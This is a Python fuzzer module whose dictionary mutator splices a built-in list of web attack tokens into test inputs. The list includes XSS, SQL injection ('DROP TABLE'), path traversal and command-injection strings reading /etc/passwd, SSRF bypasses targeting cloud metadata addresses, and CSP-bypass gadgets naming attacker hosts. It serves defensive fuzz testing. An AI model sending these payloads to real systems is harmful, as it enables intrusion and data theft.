"""Dictionary-based mutator (AFL extras style).

Loads interesting tokens/patterns from a dictionary file and inserts
or overwrites them at random positions in the input.
"""

from __future__ import annotations

import random
from pathlib import Path
from typing import TYPE_CHECKING

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed

# Built-in dictionaries for common web fuzzing
WEB_DICTIONARY = [
    # ── Traditional XSS ──────────────────────────────────────────
    b"<script>", b"</script>", b"<img src=x onerror=alert(1)>",
    b"javascript:", b"onerror=", b"onload=", b"onfocus=",
    b"<svg/onload=alert(1)>", b"'\"><", b"{{", b"}}",
    # ── SQLi ─────────────────────────────────────────────────────
    b"' OR '1'='1", b"' OR 1=1--", b"'; DROP TABLE", b"UNION SELECT",
    b"1' AND '1'='1", b"admin'--", b"\" OR \"\"=\"",
    # ── Path traversal ───────────────────────────────────────────
    b"../", b"..\\", b"....//", b"%2e%2e%2f", b"..%252f",
    b"/etc/passwd", b"C:\\Windows\\",
    # ── Command injection ────────────────────────────────────────
    b"; ls", b"| cat /etc/passwd", b"`id`", b"$(whoami)",
    b"\n", b"\r\n", b"%0a", b"%0d%0a",
    # ── SSRF: Host bypass ────────────────────────────────────────
    b"http://127.0.0.1", b"http://localhost", b"http://0.0.0.0",
    b"http://[::1]", b"http://169.254.169.254",
    # Alternative IP representations (§3-1)
    b"0x7f000001", b"017700000001", b"2130706433",
    b"127.1", b"127.0.1", b"0x7f.0x0.0x0.0x1",
    b"0177.0.0.01", b"0", b"0x0",
    # IPv6 variants
    b"[::1]", b"[::]", b"[0:0:0:0:0:0:0:1]",
    b"[::ffff:127.0.0.1]", b"[::ffff:7f00:1]",
    b"[0:0:0:0:0:ffff:127.0.0.1]",
    # Cloud metadata
    b"169.254.169.254", b"100.100.100.200",
    b"metadata.google.internal",
    # ── SSRF: Authority confusion (§2-1) ─────────────────────────
    b"evil.com@127.0.0.1", b"evil.com\\@127.0.0.1",
    b"127.0.0.1#@evil.com", b"127.0.0.1%23@evil.com",
    b"127.0.0.1:80@evil.com", b"evil.com:@127.0.0.1",
    b"@127.0.0.1", b"foo@", b"user:pass@",
    # ── SSRF: Backslash/whitespace confusion (§8) ────────────────
    b"\\", b"\\/", b"\\\\", b"\\/\\/",
    b"%5c", b"%5C", b"%09", b"%0a", b"%0d",
    b"%00", b"%2500", b"%250a",
    # ── SSRF: Scheme confusion (§1-2) ────────────────────────────
    b"file://", b"gopher://", b"dict://", b"ldap://",
    b"jar:", b"netdoc:", b"tftp://",
    # ── SSRF: Encoding tricks (§8) ───────────────────────────────
    b"%2e%2e", b"%252e", b"%c0%ae", b"%e0%80%ae",
    b"%c0%af", b"%e0%80%af", b"%ef%bc%8f",
    b"%25%30%30", b"%%30%30",
    # ── Interesting values ───────────────────────────────────────
    b"null", b"undefined", b"NaN", b"Infinity", b"-1",
    b"0", b"4294967295", b"2147483647", b"-2147483648",
    b"9999999999", b"", b" ", b"\x00", b"\xff",
    # ── Format strings ───────────────────────────────────────────
    b"%s", b"%x", b"%n", b"%p", b"AAAA",

    # ══════════════════════════════════════════════════════════════
    # Taxonomy-derived entries below
    # ══════════════════════════════════════════════════════════════

    # ── mXSS: Namespace switching (taxonomy §1) ──────────────────
    # MathML text integration points (§1-1)
    b"<math><mtext>", b"</mtext></math>",
    b"<math><mi>", b"</mi></math>",
    b"<math><mo>", b"</mo></math>",
    b"<math><ms>", b"</ms></math>",
    b"<math><mn>", b"</mn></math>",
    b'<math><annotation-xml encoding="text/html">',
    b'<math><annotation-xml encoding="application/xhtml+xml">',
    # Special MathML integration points — mglyph/malignmark
    b"<mglyph>", b"</mglyph>",
    b"<malignmark>", b"</malignmark>",
    b"<math><mtext><mglyph>", b"<math><mtext><malignmark>",
    # SVG integration points (§1-2)
    b"<svg><desc>", b"</desc></svg>",
    b"<svg><title>", b"</title></svg>",
    b"<svg><foreignObject>", b"</foreignObject></svg>",
    b'<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">',
    # Triple namespace switching (§1-3)
    b"<math><mtext><svg><foreignObject>",
    b"<svg><foreignObject><math><mtext>",
    # Namespace attributes
    b' xmlns="http://www.w3.org/2000/svg"',
    b' xmlns="http://www.w3.org/1998/Math/MathML"',
    b' xmlns="http://www.w3.org/1999/xhtml"',

    # ── mXSS: Element rearrangement (taxonomy §2) ────────────────
    # Foster parenting triggers (§2-1)
    b"<table><style>", b"<table><svg>", b"<table><math>",
    b"<table><template>", b"<select><svg>",
    # Form collapse (§2-3)
    b"<form></form><form>",
    b"<form><math><mtext></form><form>",
    # Adoption agency (§2-2)
    b"<a><div><a>", b"<b><i></b></i>",

    # ── mXSS: RAWTEXT/RCDATA confusion (taxonomy §3) ─────────────
    b"<svg><style>", b"<math><style>",
    b"<noscript>", b"</noscript>",
    b"<xmp>", b"</xmp>",
    b"<noembed>", b"</noembed>",
    b"<noframes>", b"</noframes>",
    b"<textarea>", b"</textarea>",

    # ── mXSS: Comment/CDATA boundaries (taxonomy §1-4) ───────────
    b"--!>",
    b"<!--><",
    b"<!-- --!>",
    b"<![CDATA[", b"]]>",
    b"<math><style><!--</style>",
    b"<svg><style><![CDATA[",

    # ── mXSS: Entity encoding (taxonomy §4) ──────────────────────
    b"&lt;", b"&gt;", b"&amp;", b"&quot;",
    b"&#60;", b"&#x3C;", b"&#0000060;",
    b"&amp;lt;", b"&amp;gt;",

    # ── Browser security: DOM clobbering ─────────────────────────
    b'<form id="x"><img name="y">',
    b'<a id="x" name="y" href="javascript:alert(1)">',
    b'<img name="currentScript">',
    b'<form name="document">',

    # ── Browser security: Prototype pollution ─────────────────────
    b"__proto__", b"constructor",
    b"constructor.prototype",
    b"__defineGetter__",

    # ── Browser security: CSP bypass gadgets ──────────────────────
    b'<script src="data:,alert(1)">',
    b'<base href="https://evil.com/">',
    b'<link rel="prefetch" href=',
    b'<link rel="dns-prefetch" href="//x.attacker.com">',

    # ── HTTP smuggling relevant (for HTTP targets) ────────────────
    b"Transfer-Encoding: chunked",
    b"Transfer-Encoding : chunked",
    b"Transfer-Encoding: ,chunked",
    b"Content-Length: 0\r\nContent-Length: ",
    b"0\r\n\r\n",
    b"X-Forwarded-Host: evil.com",

    # ══════════════════════════════════════════════════════════════
    # URL parser differential entries
    # ══════════════════════════════════════════════════════════════

    # ── IPv6 SSRF bypass (various notations) ─────────────────────
    b"[::ffff:127.0.0.1]", b"[::ffff:7f00:1]",
    b"[0:0:0:0:0:ffff:127.0.0.1]", b"[::ffff:10.0.0.1]",
    b"[::ffff:169.254.169.254]", b"[fe80::1%25eth0]",
    b"[fe80::1%eth0]", b"[::1%250]",
    b"[0000:0000:0000:0000:0000:0000:0000:0001]",
    # Unbracketed IPv6
    b"::1", b"::ffff:127.0.0.1",

    # ── Port confusion ───────────────────────────────────────────
    b":0", b":65536", b":65537", b":4294967296",
    b":0000080", b":080", b":-1", b":+80",
    b":99999", b":http", b":80%20",
    b":", b":.", b":/", b": ", b":\t80",
    b":80\x00", b":0x50", b":0x1bb",  # hex port
    b":80/", b":443@", b":@80",
    b":%380",  # partial encoding
    b":80%00/",  # null after port
    b":80#", b":80?", b":80\\",

    # ── Fragment boundary confusion ──────────────────────────────
    b"#@127.0.0.1", b"#@evil.com", b"%23@",
    b"##", b"#?", b"?#", b"%23",
    b"#//evil.com/", b"#\\@",
    b"#http://evil.com", b"#data:text/html,<script>",
    b"#%2f%2fevil.com", b"#%40127.0.0.1",
    b"#:80", b"#:@", b"#%00",
    b"#\x00@", b"#\\\\", b"#/../",
    b"%2523",  # double-encoded #

    # ── Query boundary confusion ─────────────────────────────────
    b"?#", b"??", b"%3f", b"%3F",
    b"?@127.0.0.1", b"?url=http://127.0.0.1",
    b"?//evil.com", b"?\\\\evil.com",
    b";key=val", b"?key=val;extra",  # semicolon separator
    b"?%23fragment", b"?key=%26extra=1",
    b"?%00", b"?\x00key",
    b"?url=//127.0.0.1", b"?next=http://localhost",

    # ── Userinfo/authority confusion ─────────────────────────────
    b"@", b"%40", b"@@", b":@", b"\\@",
    b"%5c@", b"evil.com%5c@127.0.0.1",
    b"evil.com%2540127.0.0.1",

    # ── Unicode invisible chars in host ──────────────────────────
    b"\xe2\x80\x8b",  # Zero-width space U+200B
    b"\xe2\x80\x8c",  # Zero-width non-joiner U+200C
    b"\xe2\x80\x8d",  # Zero-width joiner U+200D
    b"\xef\xbb\xbf",  # UTF-8 BOM
    b"\xef\xbc\xa0",  # Fullwidth @ U+FF20
    b"\xef\xbc\x8f",  # Fullwidth / U+FF0F
    b"\xef\xbc\x9c",  # Fullwidth < U+FF1C
    # Fullwidth digits for IP (U+FF10-U+FF19)
    b"\xef\xbc\x91\xef\xbc\x92\xef\xbc\x97",  # 127 in fullwidth

    # ── Double/triple encoding ───────────────────────────────────
    b"%252e%252e", b"%252f", b"%255c",
    b"%25252e", b"%25252f",
    b"%2523", b"%2540",

    # ── Null byte positions ──────────────────────────────────────
    b"%00@", b"@%00", b"%00.",
    b".%00", b":%00", b"%00:",
    b"%00//", b"//%00",

    # ── Backslash variations ─────────────────────────────────────
    b"\\.", b".\\", b"\\\\",
    b"\\/", b"/\\", b"\\://",
    b"%5c.", b".%5c",
]


class DictionaryMutator:
    """Dictionary-based mutation — insert/overwrite interesting tokens."""

    name = "dictionary"

    def __init__(
        self,
        seed: int | None = None,
        dictionary: list[bytes] | None = None,
        dict_file: Path | None = None,
    ) -> None:
        self.rng = random.Random(seed)
        self.entries: list[bytes] = list(dictionary or WEB_DICTIONARY)

        if dict_file and dict_file.exists():
            self._load_file(dict_file)

    def _load_file(self, path: Path) -> None:
        """Load dictionary entries from file (one per line, # comments)."""
        for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                # Handle quoted entries: "entry"
                if line.startswith('"') and line.endswith('"'):
                    line = line[1:-1]
                self.entries.append(line.encode("utf-8"))

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        data = bytearray(inp.data)
        if not self.entries:
            return inp

        # Apply 1-3 dictionary operations
        num_ops = self.rng.randint(1, 3)
        for _ in range(num_ops):
            entry = self.rng.choice(self.entries)
            op = self.rng.randint(0, 2)

            if op == 0:  # insert
                pos = self.rng.randint(0, len(data))
                data[pos:pos] = entry
            elif op == 1:  # overwrite
                if data:
                    pos = self.rng.randint(0, max(0, len(data) - 1))
                    end = min(pos + len(entry), len(data))
                    data[pos:end] = entry[:end - pos]
            else:  # append
                data.extend(entry)

        return Input(
            data=bytes(data),
            metadata={**inp.metadata, "mutator": self.name},
        )
